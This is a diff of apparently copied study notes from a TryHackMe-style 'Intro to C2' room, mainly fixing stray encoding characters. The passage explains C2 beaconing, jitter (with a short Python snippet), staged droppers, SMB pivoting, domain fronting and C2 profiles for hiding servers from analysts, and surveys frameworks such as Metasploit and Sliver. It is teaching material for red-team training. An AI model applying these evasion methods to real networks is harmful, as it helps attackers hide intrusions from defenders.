@@ -1,9 +1,7 @@
 ﻿# Introduction
 ---
 
-### Welcome to Intro toÂ C2Â 
-
-Command and Control (C2) Frameworks are an essential part of both Red Teamers and Advanced Adversaries playbooks. They make it both easy to manage compromised devices during an engagement and often help aid in lateral movement.
+### Welcome to Intro to C2 Command and Control (C2) Frameworks are an essential part of both Red Teamers and Advanced Adversaries playbooks. They make it both easy to manage compromised devices during an engagement and often help aid in lateral movement.
 
 ### Room Objectives
 
@@ -12,15 +10,15 @@ In this room, we will learn about Command and Control Frameworks in-depth to gai
 - How a Command and Control Framework operates
 - The various components that you may use.
 - How to set up a basic Command and Control Framework
-- Use ArmitageÂ **or**Â MetasploitÂ to gain familiarity with a Command and Control Framework
+- Use Armitage **or** Metasploit to gain familiarity with a Command and Control Framework
 - How to administer a Command and Control Framework
-- OPSECÂ Considerations while administering a Command and Control Framework
+- OPSEC Considerations while administering a Command and Control Framework
 - And much more!
 
-Room Prerequisites  
+Room Prerequisites 
 
-- General experience with theÂ MetasploitÂ Framework, for more information, see theÂ [MetasploitÂ Module](https://tryhackme.com/module/metasploit).
-- General familiarity with Red Teaming; for more information, see theÂ [Red Team Fundamentals](https://tryhackme.com/room/redteamfundamentals)Â room.
+- General experience with the Metasploit Framework, for more information, see the [Metasploit Module](https://tryhackme.com/module/metasploit).
+- General familiarity with Red Teaming; for more information, see the [Red Team Fundamentals](https://tryhackme.com/room/redteamfundamentals) room.
 - General familiarity with exploiting vulnerable virtual machines.
 
 
@@ -29,44 +27,44 @@ Room Prerequisites
 
 ### What is a Command and Control Framework
 
-While trying to digest the various components of aÂ C2Â framework, it may be intimidating. However, they donâ€™t have to be. In order to better understand what aÂ C2Â framework is at its most basic level, think of a Netcat listener (theÂ C2Â server) that is capable of handling many reverse shells calling back at once (C2Â Agents). Itâ€™s a server but for reverse shells. Unlike Netcat, almost allÂ C2Â frameworks require a special payload generator. This is usually a feature that is built into the framework itself. For example,Â MetasploitÂ is aÂ C2Â Framework that has its own payload generator, MSFVenom.
+While trying to digest the various components of a C2 framework, it may be intimidating. However, they donâ€™t have to be. In order to better understand what a C2 framework is at its most basic level, think of a Netcat listener (the C2 server) that is capable of handling many reverse shells calling back at once (C2 Agents). Itâ€™s a server but for reverse shells. Unlike Netcat, almost all C2 frameworks require a special payload generator. This is usually a feature that is built into the framework itself. For example, Metasploit is a C2 Framework that has its own payload generator, MSFVenom.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/661abd734022d8a1f3050e90d3fb6861.png)
 
-_The Diagram above depicts three compromised clients calling back to aÂ C2Â Server.  
+_The Diagram above depicts three compromised clients calling back to a C2 Server. 
 _
 
-So what exactly makesÂ C2Â frameworks better than a normal Netcat listener? It seems like all someone needs to do is implement session management into Netcat, and you have the same thing? While this is true,Â C2Â frameworks shine in their â€œPost Exploitationâ€ features.
+So what exactly makes C2 frameworks better than a normal Netcat listener? It seems like all someone needs to do is implement session management into Netcat, and you have the same thing? While this is true, C2 frameworks shine in their â€œPost Exploitationâ€ features.
 
-### Command and Control Structure  
+### Command and Control Structure 
 
-### **C2Â Server**
+### **C2 Server**
 
-In order to understand a Command and Control framework, we must first start by understanding the various components of aÂ C2Â server. Letâ€™s start with the most essential component - TheÂ C2Â Server itself. TheÂ C2Â Server serves as a hub for agents to call back to. Agents will periodically reach out to theÂ C2Â server and wait for the operatorâ€™s commands.
+In order to understand a Command and Control framework, we must first start by understanding the various components of a C2 server. Letâ€™s start with the most essential component - The C2 Server itself. The C2 Server serves as a hub for agents to call back to. Agents will periodically reach out to the C2 server and wait for the operatorâ€™s commands.
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/5de5e62c5ba37013302790062b6b429e.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/5de5e62c5ba37013302790062b6b429e.png) 
 
-_This screenshot depicts a basicÂ C2Â server diagram._
+_This screenshot depicts a basic C2 server diagram._
 
 ### **Agents / Payloads**
 
-An agent is a program generated by theÂ C2Â framework that calls back to a listener on aÂ C2Â server. Most of the time, this agent enables special functionality compared to a standard reverse shell. MostÂ C2Â Frameworks implement pseudo commands to make theÂ C2Â Operatorâ€™s life easier. Some examples of this may be a pseudo command to Download or Upload a file onto the system. Itâ€™s important to know that agents can be highly configurable, with adjustments on the timing of how oftenÂ C2Â Agents beacon out to a Listener on aÂ C2Â Server and much more.
+An agent is a program generated by the C2 framework that calls back to a listener on a C2 server. Most of the time, this agent enables special functionality compared to a standard reverse shell. Most C2 Frameworks implement pseudo commands to make the C2 Operatorâ€™s life easier. Some examples of this may be a pseudo command to Download or Upload a file onto the system. Itâ€™s important to know that agents can be highly configurable, with adjustments on the timing of how often C2 Agents beacon out to a Listener on a C2 Server and much more.
 
 ### **Listeners**
 
-On the most basic level, a listener is an application running on theÂ C2Â server that waits for a callback over a specific port or protocol. Some examples of this areÂ DNS,Â HTTP, and or HTTPS.
+On the most basic level, a listener is an application running on the C2 server that waits for a callback over a specific port or protocol. Some examples of this are DNS, HTTP, and or HTTPS.
 
 ### **Beacons**
 
-A Beacon is the process of aÂ C2Â Agent calling back to the listener running on aÂ C2Â Server.
+A Beacon is the process of a C2 Agent calling back to the listener running on a C2 Server.
 
-  
+ 
 
 ### Obfuscating Agent Callbacks
 
-### **Sleep Timers**  
+### **Sleep Timers** 
 
-One key thing that some security analysts, anti-virus, and next-generation firewalls look for when attempting to identify Command and Control traffic is beaconing and the rate at which a device beacons out to aÂ C2Â server. Letâ€™s say aÂ firewallÂ observed traffic that looks like so
+One key thing that some security analysts, anti-virus, and next-generation firewalls look for when attempting to identify Command and Control traffic is beaconing and the rate at which a device beacons out to a C2 server. Letâ€™s say a firewall observed traffic that looks like so
 
 - TCP/443 - Session Duration 3s, 55 packets sent, 10:00:05.000
 - TCP/443 - Session Duration 2s, 33 packets sent, 10:00:10.000
@@ -78,7 +76,7 @@ A pattern is starting to form. The agent beacons out every 5 seconds; this means
 
 **Jitter**
 
-Jitter takes the sleep timer and adds some variation to it; ourÂ C2Â beaconing may now exhibit a strange pattern that may show activity that is closer to an average user:
+Jitter takes the sleep timer and adds some variation to it; our C2 beaconing may now exhibit a strange pattern that may show activity that is closer to an average user:
 
 - TCP/443 - Session Duration 3s, 55 packets sent, 10:00:03.580
 - TCP/443 - Session Duration 2s, 33 packets sent, 10:00:13.213
@@ -86,7 +84,7 @@ Jitter takes the sleep timer and adds some variation to it; ourÂ C2Â beaconi
 - TCP/443 - Session Duration 1s, 33 packets sent, 10:00:23.444
 - TCP/443 - Session Duration 3s, 55 packets sent, 10:00:27.182
 
-The beaconing is now set at a semi-irregular pattern that makes it slightly more difficult to identify among regular user traffic. In more advancedÂ C2Â frameworks, it may be possible to alter various other parameters, like â€œFileâ€ jitter or adding junk data to the payload or files being transmitted to make it seem larger than it actually is.
+The beaconing is now set at a semi-irregular pattern that makes it slightly more difficult to identify among regular user traffic. In more advanced C2 frameworks, it may be possible to alter various other parameters, like â€œFileâ€ jitter or adding junk data to the payload or files being transmitted to make it seem larger than it actually is.
 
 Sample Python3 code for Jitter may look like so:
 
@@ -96,161 +94,155 @@ Sample Python3 code for Jitter may look like so:
 
 `jitter = random.randint(-30,30)`
 
-`sleep = sleep + jitter   `  
+`sleep = sleep + jitter ` 
 
-It's important to note that this is a fundamental example,Â  but it can be much more math-heavy, setting upper bounds and lower bounds, taking percentages of last sleep, and building on from there. Because this is an introduction room, we will spare you a complicated formula.
+It's important to note that this is a fundamental example, but it can be much more math-heavy, setting upper bounds and lower bounds, taking percentages of last sleep, and building on from there. Because this is an introduction room, we will spare you a complicated formula.
 
-  
+ 
 
 ### Payload Types
 
-Much like a regular Reverse Shell, there are two primary types of payloads that you may be able to use in yourÂ C2Â Framework;Â **Staged**Â andÂ **Stageless**Â payloads.
+Much like a regular Reverse Shell, there are two primary types of payloads that you may be able to use in your C2 Framework; **Staged** and **Stageless** payloads.
 
 **Stageless Payloads**
 
-Stageless Payloads are the simplest of the two; they contain the fullÂ C2Â agent and will call back to theÂ C2Â server and begin beaconing immediately. You can refer to the diagram below to gain a better understanding of how Stageless payloads operate.
+Stageless Payloads are the simplest of the two; they contain the full C2 agent and will call back to the C2 server and begin beaconing immediately. You can refer to the diagram below to gain a better understanding of how Stageless payloads operate.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e79d46d97f108842b9424ae5a134d2f8.png)
 
-_This screenshot depicts a stageless payload calling back to aÂ C2Â server_
+_This screenshot depicts a stageless payload calling back to a C2 server_
 
-The steps for establishingÂ C2Â beaconing with a Stageless payload are as follows:
+The steps for establishing C2 beaconing with a Stageless payload are as follows:
 
-  
+ 
 
-1.Â The Victim downloads and executes the Dropper  
+1. The Victim downloads and executes the Dropper 
 
-2.Â The beaconing to theÂ C2Â Server begins
+2. The beaconing to the C2 Server begins
 
-  
+ 
 
 **Staged Payloads**
 
-Staged payloads require a callback to theÂ C2Â server to download additional parts of theÂ C2Â agent. This is commonly referred to as a â€œDropperâ€ because it is â€œDroppedâ€ onto the victim machine to download the second stage of our staged payload. This is a preferred method over stageless payloads because a small amount of code needs to be written to retrieve the additional parts of theÂ C2Â agent from theÂ C2Â server. It also makes it easier to obfuscate code to bypass Anti-Virus programs.
+Staged payloads require a callback to the C2 server to download additional parts of the C2 agent. This is commonly referred to as a â€œDropperâ€ because it is â€œDroppedâ€ onto the victim machine to download the second stage of our staged payload. This is a preferred method over stageless payloads because a small amount of code needs to be written to retrieve the additional parts of the C2 agent from the C2 server. It also makes it easier to obfuscate code to bypass Anti-Virus programs.
 
-  
+ 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e6127ac6a295a1d9b01444757f711084.png)
 
-_This diagram depicts a dropper calling back to aÂ C2Â server for its second stage._
+_This diagram depicts a dropper calling back to a C2 server for its second stage._
 
-The steps for establishingÂ C2Â beaconing with a Staged payload are as follows:
+The steps for establishing C2 beaconing with a Staged payload are as follows:
 
-  
+ 
 
-**1.**Â The Victim downloads and executes the Dropper  
+**1.** The Victim downloads and executes the Dropper 
 
-**2.**Â The Dropper calls back to theÂ C2Â Server for Stage 2
+**2.** The Dropper calls back to the C2 Server for Stage 2
 
-**3.**Â TheÂ C2Â Server sends Stage 2 back to the Victim Workstation
+**3.** The C2 Server sends Stage 2 back to the Victim Workstation
 
-**4.**Â Stage 2 is loaded into memory on the Victim WorkstationÂ 
+**4.** Stage 2 is loaded into memory on the Victim Workstation **5.** C2 Beaconing Initializes, and the Red Teamer/Threat Actors can engage with the Victim on the C2 Server.
 
-**5.**Â C2Â Beaconing Initializes, and the Red Teamer/Threat Actors can engage with the Victim on theÂ C2Â Server.
-
-  
+ 
 
 ### Payload Formats
 
-As you may know, WindowsÂ PEÂ files (Executables) are not the only way to execute code on a system. SomeÂ C2Â Frameworks support payloads in various other formats, for example:
+As you may know, Windows PE files (Executables) are not the only way to execute code on a system. Some C2 Frameworks support payloads in various other formats, for example:
 
-- PowerShellÂ Scripts
-    - Which may contain C# Code and may be compiled and executed with the Add-Type commandlet
-- HTAÂ Files
+- PowerShell Scripts
+ - Which may contain C# Code and may be compiled and executed with the Add-Type commandlet
+- HTA Files
 - JScript Files
 - Visual Basic Application/Scripts
 - Microsoft Office Documents
 
-and many more. For more information on various other payload formats, you should review theÂ [Weaponization](https://tryhackme.com/room/weaponization)Â room in the Initial Access module.
+and many more. For more information on various other payload formats, you should review the [Weaponization](https://tryhackme.com/room/weaponization) room in the Initial Access module.
 
-  
+ 
 
 ### Modules
 
-Modules are a core component of anyÂ C2Â Framework; they add the ability to make agents and theÂ C2Â server more flexible. Depending on theÂ C2Â Framework, scripts must be written in different languages. Cobalt Strike has â€œAggressor Scriptsâ€, which are written in the â€œAggressor Scripting Languageâ€.Â PowerShellÂ Empire has support for multiple languages,Â Metasploitâ€™s Modules are written in Ruby, and many others are written in many other languages.
+Modules are a core component of any C2 Framework; they add the ability to make agents and the C2 server more flexible. Depending on the C2 Framework, scripts must be written in different languages. Cobalt Strike has â€œAggressor Scriptsâ€, which are written in the â€œAggressor Scripting Languageâ€. PowerShell Empire has support for multiple languages, Metasploitâ€™s Modules are written in Ruby, and many others are written in many other languages.
 
 ### **Post Exploitation Modules**
 
-Post Exploitation modules are simply modules that deal with anything after the initial point of compromise, this could be as simple as running SharpHound.ps1 to find paths of lateral movement, or it could be as complex as dumping LSASS and parsing credentials in memory. For more information on Post Exploitation, refer to theÂ [Post Exploitation Basics](https://tryhackme.com/room/postexploit)Â room.
+Post Exploitation modules are simply modules that deal with anything after the initial point of compromise, this could be as simple as running SharpHound.ps1 to find paths of lateral movement, or it could be as complex as dumping LSASS and parsing credentials in memory. For more information on Post Exploitation, refer to the [Post Exploitation Basics](https://tryhackme.com/room/postexploit) room.
 
 ### **Pivoting Modules**
 
-One of the last major components of aÂ C2Â Framework is its pivoting modules, making it easier to access restricted network segments within theÂ C2Â Framework. If you have Administrative Access on a system, you may be able to open up an â€œSMBÂ Beaconâ€, which can enable a machine to act as aÂ proxyÂ via theÂ SMBÂ protocol. This may allow machines in a restricted network segment to communicate with yourÂ C2Â server.
+One of the last major components of a C2 Framework is its pivoting modules, making it easier to access restricted network segments within the C2 Framework. If you have Administrative Access on a system, you may be able to open up an â€œSMB Beaconâ€, which can enable a machine to act as a proxy via the SMB protocol. This may allow machines in a restricted network segment to communicate with your C2 server.
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/da7b0247ff1db8e98c9358c39a0c3d21.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/da7b0247ff1db8e98c9358c39a0c3d21.png) 
 
-_This diagram depicts multiple victims with anÂ SMBÂ pivot calling back to aÂ C2Â server._
+_This diagram depicts multiple victims with an SMB pivot calling back to a C2 server._
 
 ### 
 
-The diagram above shows how hosts within a restricted network segment call back to theÂ C2Â Server:
+The diagram above shows how hosts within a restricted network segment call back to the C2 Server:
 
-  
+ 
 
-1.Â The Victims call back to anÂ SMBÂ named pipe on another Victim in a non-restricted network segment.  
+1. The Victims call back to an SMB named pipe on another Victim in a non-restricted network segment. 
 
-2.Â The Victim in the non-restricted network segment calls back to theÂ C2Â Server over a standard beacon.
+2. The Victim in the non-restricted network segment calls back to the C2 Server over a standard beacon.
 
-3.Â TheÂ C2Â Server then sends commands back to the Victim in the non-restricted network segment.
+3. The C2 Server then sends commands back to the Victim in the non-restricted network segment.
 
-4.Â The Victim in the non-restricted network segment then forwards theÂ C2Â instructions to the hosts in the restricted segment.
+4. The Victim in the non-restricted network segment then forwards the C2 instructions to the hosts in the restricted segment.
 
-  
+ 
 
-### Facing the worldÂ 
-
-One important obstacle that all Red Teamers must overcome is placing infrastructure in plain view. There are many different methods to do this; one of the most popular methods is called "Domain Fronting".
+### Facing the world One important obstacle that all Red Teamers must overcome is placing infrastructure in plain view. There are many different methods to do this; one of the most popular methods is called "Domain Fronting".
 
 **Domain Fronting**
 
-Domain Fronting utilizes a known, good host (for example) Cloudflare. Cloudflare runs a business that provides enhanced metrics onÂ HTTPÂ connection details as well as cachingÂ HTTPÂ connection requests to save bandwidth.Â  Red Teamers can abuse this to make it appear that a workstation or server is communicating with a known, trusted IP Address. Geolocation results will show wherever the nearest Cloudflare server is, and the IP Address will show as ownership to Cloudflare.
+Domain Fronting utilizes a known, good host (for example) Cloudflare. Cloudflare runs a business that provides enhanced metrics on HTTP connection details as well as caching HTTP connection requests to save bandwidth. Red Teamers can abuse this to make it appear that a workstation or server is communicating with a known, trusted IP Address. Geolocation results will show wherever the nearest Cloudflare server is, and the IP Address will show as ownership to Cloudflare.
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/cd1ea19e9e0d7bef0d8ec6615061335b.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/cd1ea19e9e0d7bef0d8ec6615061335b.png) 
 
-_This diagram shows an exampleÂ HTTPÂ beacon from a compromised device._
+_This diagram shows an example HTTP beacon from a compromised device._
 
 ### 
 
 The diagram above depicts how Domain Fronting works:
 
-  
+ 
 
-1.Â TheÂ C2Â Operator has a domain that proxies all requests through Cloudflare.Â   
+1. The C2 Operator has a domain that proxies all requests through Cloudflare. 2. The Victim beacons out to the C2 Domain.
 
-2.Â The Victim beacons out to theÂ C2Â Domain.
+3. Cloudflare proxies the request, then looks at the Host header and relays the traffic to the correct server.
 
-3.Â Cloudflare proxies the request, then looks at the Host header and relays the traffic to the correct server.
+4. The C2 Server then responds to Cloudflare with the C2 Commands.
 
-4.Â TheÂ C2Â Server then responds to Cloudflare with theÂ C2Â Commands.
+**5.** The Victim then receives the command from Cloudflare.
 
-**5.**Â The Victim then receives the command from Cloudflare.
+ 
 
-  
+**C2 Profiles**
 
-**C2Â Profiles**
+The next technique goes by several names by several different products, "NGINX Reverse Proxy", "Apache Mod_Proxy/Mod_Rewrite", "Malleable HTTP C2 Profiles", and many others. However, they are all more or less the same. All of the Proxy features more or less allow a user to control specific elements of the incoming HTTP request. Let's say an incoming connection request has an "X-C2-Server" header; we could explicitly extract this header using the specific technology that is at your disposal (Reverse Proxy, Mod_Proxy/Rewrite, Malleable C2 Profile, etc.) and ensure that your C2 server responds with C2 based responses. Whereas if a normal user queried the HTTP Server, they might see a generic webpage. This is all dependent on your configuration.
 
-The next technique goes by several names by several different products, "NGINX ReverseÂ Proxy", "ApacheÂ Mod_Proxy/Mod_Rewrite",Â  "MalleableÂ HTTPÂ C2Â Profiles", and many others. However, they are all more or less the same. All of theÂ ProxyÂ features more or less allow a user to control specific elements of the incomingÂ HTTPÂ request. Let's say an incoming connection request has an "X-C2-Server" header; we could explicitly extract this header using the specific technology that is at your disposal (ReverseÂ Proxy, Mod_Proxy/Rewrite, MalleableÂ C2Â Profile, etc.) and ensure that yourÂ C2Â server responds withÂ C2Â based responses. Whereas if a normal user queried theÂ HTTPÂ Server, they might see a generic webpage. This is all dependent on your configuration.
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/22eac0e3ab2de3f61d57e858cee3e33e.png) 
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/22eac0e3ab2de3f61d57e858cee3e33e.png)  
+_A Compromised Device and Security Analyst reach out to a C2 server, only the Compromised device gets a C2 Beacon back - the Analyst gets Cloudflare's website back._
 
-_A Compromised Device and Security Analyst reach out to aÂ C2Â server, only the Compromised device gets aÂ C2Â Beacon back - the Analyst gets Cloudflare's website back._
+The diagram above depicts how C2 profiles work:
 
-The diagram above depicts howÂ C2Â profiles work:
+ 
 
-  
+1. The Victim beacons out to the C2 Server with a custom header in the HTTP request, while a SOC Analyst has a normal HTTP Request 
 
-1.Â The Victim beacons out to theÂ C2Â Server with a custom header in theÂ HTTPÂ request, while aÂ SOCÂ Analyst has a normalÂ HTTPÂ Request  
+2. The requests are proxied through Cloudflare
 
-2.Â The requests are proxied through Cloudflare
+3. The C2 Server receives the request and looks for the custom header, and then evaluates how to respond based on the C2 Profile.
 
-3.Â TheÂ C2Â Server receives the request and looks for the custom header, and then evaluates how to respond based on theÂ C2Â Profile.
+**4.** The C2 Server responds to the client and responds to the Analyst/Compromised device.
 
-**4.**Â TheÂ C2Â Server responds to the client and responds to the Analyst/Compromised device.
+ 
 
-  
+Because HTTPS requests are encrypted, extracting specific headers (ex: X-C2-Server, or Host) may be impossible. By using C2 Profiles, we may be able to hide our C2 server from the prying eyes of a Security Analyst. For more information on how C2 profiles can be powerful, see this blog post on [Understanding Malleable C2 Profiles for Cobalt Strike](https://blog.zsec.uk/cobalt-strike-profiles/).
 
-Because HTTPS requests are encrypted, extracting specific headers (ex: X-C2-Server, or Host) may be impossible. By usingÂ C2Â Profiles, we may be able to hide ourÂ C2Â server from the prying eyes of a Security Analyst. For more information on howÂ C2Â profiles can be powerful, see this blog post onÂ [Understanding MalleableÂ C2Â Profiles for Cobalt Strike](https://blog.zsec.uk/cobalt-strike-profiles/).
-
-In task 7, we will explain and explore another technique called "Redirectors". We will gain hands-on experience configuringÂ MetasploitÂ andÂ ApacheÂ 2 to demonstrate how a redirector is set up.
+In task 7, we will explain and explore another technique called "Redirectors". We will gain hands-on experience configuring Metasploit and Apache 2 to demonstrate how a redirector is set up.
 
 
 ![Pasted image 20250512122559.png](../../../IMAGES/Pasted%20image%2020250512122559.png)
@@ -259,54 +251,54 @@ In task 7, we will explain and explore another technique called "Redirectors". W
 # Common C2 Frameworks
 ----
 
-Throughout your journey, you may encounter many differentÂ C2Â Frameworks; we will discuss a few popularÂ C2Â Frameworks that are widely used by Red Teamers and Adversaries alike. We will be dividing this into two sections:
+Throughout your journey, you may encounter many different C2 Frameworks; we will discuss a few popular C2 Frameworks that are widely used by Red Teamers and Adversaries alike. We will be dividing this into two sections:
 
 - Free
 - Premium/Paid
 
-You may ask some questions like â€œWhy would I use a premium or paidÂ C2Â framework?â€, and this is an excellent question. Premium/PaidÂ C2Â frameworks usually are less likely to be detected by Anti-Virus vendors. This is not to say that it's impossible to be detected, just that open-sourceÂ C2Â projects are generally well understood, and signatures can be easily developed.
+You may ask some questions like â€œWhy would I use a premium or paid C2 framework?â€, and this is an excellent question. Premium/Paid C2 frameworks usually are less likely to be detected by Anti-Virus vendors. This is not to say that it's impossible to be detected, just that open-source C2 projects are generally well understood, and signatures can be easily developed.
 
-Usually, premiumÂ C2Â frameworks generally have more advanced post-exploitation modules, pivoting features, and even feature requests that open-source software developers may sometimes not fulfill. For example, one feature Cobalt Strike offers that most otherÂ C2Â frameworks do not is the ability to open aÂ VPNÂ tunnel from a beacon. This can be a fantastic feature if aÂ ProxyÂ does not work well in your specific situation. You must do your research to find out what will work best for your team.
+Usually, premium C2 frameworks generally have more advanced post-exploitation modules, pivoting features, and even feature requests that open-source software developers may sometimes not fulfill. For example, one feature Cobalt Strike offers that most other C2 frameworks do not is the ability to open a VPN tunnel from a beacon. This can be a fantastic feature if a Proxy does not work well in your specific situation. You must do your research to find out what will work best for your team.
 
-  
+ 
 
-### FreeÂ C2Â Frameworks
+### Free C2 Frameworks
 
 **Metasploit**
 
-TheÂ [MetasploitÂ Framework](https://www.metasploit.com/), developed and maintained by Rapid7, is one of the most popular Exploitation and Post Exploitation frameworks (C2) that is publicly available and is installed on most penetration testing distributions.
+The [Metasploit Framework](https://www.metasploit.com/), developed and maintained by Rapid7, is one of the most popular Exploitation and Post Exploitation frameworks (C2) that is publicly available and is installed on most penetration testing distributions.
 
 **MSFConsole
 
 ```shell-session
 root@kali$ msfconsole
-                                                  
+ 
 
-      .:okOOOkdc'           'cdkOOOko:.
-    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
-   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
-  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
-  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
-  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
-  lOOOOOOOO.         ;d;         ,OOOOOOOOl
-  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
-   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
-    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
-     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
-      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
-       .dOOo   .OOOOocccxOOOO.   xOOd.
-         ,kOl  .OOOOOOOOOOOOO. .dOk,
-           :kk;.OOOOOOOOOOOOO.cOk:
-             ;kOOOOOOOOOOOOOOOk:
-               ,xOOOOOOOOOOOx,
-                 .lOOOOOOOl.
-                    ,dOd,
-                      .
+ .:okOOOkdc' 'cdkOOOko:.
+ .xOOOOOOOOOOOOc cOOOOOOOOOOOOx.
+ :OOOOOOOOOOOOOOOk, ,kOOOOOOOOOOOOOOO:
+ 'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+ oOOOOOOOO. .oOOOOoOOOOl. ,OOOOOOOOo
+ dOOOOOOOO. .cOOOOOc. ,OOOOOOOOx
+ lOOOOOOOO. ;d; ,OOOOOOOOl
+ .OOOOOOOO. .; ; ,OOOOOOOO.
+ cOOOOOOO. .OOc. 'oOO. ,OOOOOOOc
+ oOOOOOO. .OOOO. :OOOO. ,OOOOOOo
+ lOOOOO. .OOOO. :OOOO. ,OOOOOl
+ ;OOOO' .OOOO. :OOOO. ;OOOO;
+ .dOOo .OOOOocccxOOOO. xOOd.
+ ,kOl .OOOOOOOOOOOOO. .dOk,
+ :kk;.OOOOOOOOOOOOO.cOk:
+ ;kOOOOOOOOOOOOOOOk:
+ ,xOOOOOOOOOOOx,
+ .lOOOOOOOl.
+ ,dOd,
+ .
 
-       =[ metasploit v6.1.12-dev                          ]
-+ -- --=[ 2177 exploits - 1152 auxiliary - 399 post       ]
-+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
-+ -- --=[ 9 evasion                                       ]
+ =[ metasploit v6.1.12-dev ]
++ -- --=[ 2177 exploits - 1152 auxiliary - 399 post ]
++ -- --=[ 596 payloads - 45 encoders - 10 nops ]
++ -- --=[ 9 evasion ]
 
 Metasploit tip: View a module's description using 
 info, or the enhanced version in your browser with 
@@ -316,27 +308,27 @@ msf6 >
 ```
 
 
-**Armitage**  
+**Armitage** 
 
-[Armitage](https://web.archive.org/web/20211006153158/http://www.fastandeasyhacking.com/)Â is an extension of theÂ MetasploitÂ Framework - it adds a Graphical user interface and is written in Java, and is incredibly similar to Cobalt Strike. This is because they were both developed by Raphael Mudge. Armitage offers an easy way to enumerate and visualize all of your targets. Aside from looking a lot like Cobalt Strike, it even offers some unique features. One of the most popular can be found in the â€œAttacksâ€ menu; This feature is known as the Hail Mary attack, which attempts to run all exploits for the services running on a specific workstation. Armitage really is â€œFast and Easy Hackingâ€.
+[Armitage](https://web.archive.org/web/20211006153158/http://www.fastandeasyhacking.com/) is an extension of the Metasploit Framework - it adds a Graphical user interface and is written in Java, and is incredibly similar to Cobalt Strike. This is because they were both developed by Raphael Mudge. Armitage offers an easy way to enumerate and visualize all of your targets. Aside from looking a lot like Cobalt Strike, it even offers some unique features. One of the most popular can be found in the â€œAttacksâ€ menu; This feature is known as the Hail Mary attack, which attempts to run all exploits for the services running on a specific workstation. Armitage really is â€œFast and Easy Hackingâ€.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/6fc808991c2ea5a5faae2a271f9bf907.png)
 
 _A Screenshot of the Armitage UI_
 
-  
+ 
 
-**PowershellÂ Empire/Starkiller**
+**Powershell Empire/Starkiller**
 
-[PowershellÂ Empire](https://bc-security.gitbook.io/empire-wiki/)Â andÂ [Starkiller](https://github.com/BC-SECURITY/Starkiller)Â is another incredibly popularÂ C2Â originally created by Harmjoy, Sixdub, and Enigma0x3 from Veris Group. Currently, the project has been discontinued and has been picked up by the BC Security team (Cx01N, Hubbl3, and _Vinnybod). Empire features agents written in various languages compatible with multiple platforms, making it an incredibly versatileÂ C2. For more information on Empire, we recommend you take a look at theÂ [PowershellÂ Empire](https://tryhackme.com/room/rppsempire)Â room.
+[Powershell Empire](https://bc-security.gitbook.io/empire-wiki/) and [Starkiller](https://github.com/BC-SECURITY/Starkiller) is another incredibly popular C2 originally created by Harmjoy, Sixdub, and Enigma0x3 from Veris Group. Currently, the project has been discontinued and has been picked up by the BC Security team (Cx01N, Hubbl3, and _Vinnybod). Empire features agents written in various languages compatible with multiple platforms, making it an incredibly versatile C2. For more information on Empire, we recommend you take a look at the [Powershell Empire](https://tryhackme.com/room/rppsempire) room.
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/7605d1d88a01604402dcde1878a8acd0.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/7605d1d88a01604402dcde1878a8acd0.png) 
 
 _A Screenshot of the Starkiller UI_
 
 **Covenant**
 
-[Covenant](https://github.com/cobbr/Covenant)Â by Ryan Cobb is the last freeÂ C2Â Framework we will be covering - By far, it is one of the most uniqueÂ C2Â Frameworks being written in C#. UnlikeÂ Metasploit/Armitage, Itâ€™s primarily used for post-exploitation and lateral movement withÂ HTTP, HTTPS, andÂ SMBÂ listeners with highly customizableÂ agents.
+[Covenant](https://github.com/cobbr/Covenant) by Ryan Cobb is the last free C2 Framework we will be covering - By far, it is one of the most unique C2 Frameworks being written in C#. Unlike Metasploit/Armitage, Itâ€™s primarily used for post-exploitation and lateral movement with HTTP, HTTPS, and SMB listeners with highly customizable agents.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/55f84861830c1bc50d2b251bda883019.PNG)
 
@@ -346,17 +338,15 @@ _A Screenshot of the Covenant UI_
 
 Sliver
 
-[Sliver](https://github.com/BishopFox/sliver)Â byÂ [Bishop Fox](https://bishopfox.com/)Â is an advanced, highly customizable multi-user,Â CLI-basedÂ C2Â framework. Sliver is written in Go, which makes reverse engineering theÂ C2Â "implants" incredibly difficult. It supports various protocols forÂ C2Â communications like WireGuard,Â mTLS,Â HTTP(S),Â DNS, and much more. Additionally, it supportsÂ BOFÂ files for additional functionality,Â DNSÂ Canary Domains for maskingÂ C2Â communications, automatic Let's Encrypt certificate generation for HTTPS beacons, and much more.Â Â 
